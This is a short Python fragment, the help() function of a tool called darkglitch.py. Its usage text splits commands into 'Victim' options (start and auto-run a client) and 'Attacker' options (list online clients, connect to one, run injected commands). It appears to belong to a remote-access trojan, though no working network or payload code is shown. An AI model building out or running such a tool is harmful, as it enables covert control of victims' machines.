def help():
    print("""
    Usage:

    Victim:
        python darkglitch.py -l
        python darkglitch.py -r

    Attacker:
        python darkglitch.py -ol
        python darkglitch.py -s <client_id>
        python darkglitch.py -c <client_id> <command_injection>

    Options:
        -h, --help            Show help message
        -v, --version         Show version information

    Victim Options:
        -l, --listen          Start the client and wait for connections
        -r, --run             Automatic start client script  

    Attacker Options:
        -ol, --online-list    List online clients
        -c, --connect         Connect to a client

    Arguments:
        <client_id>           Target client ID
        <command_injection>             Command to execute
    """)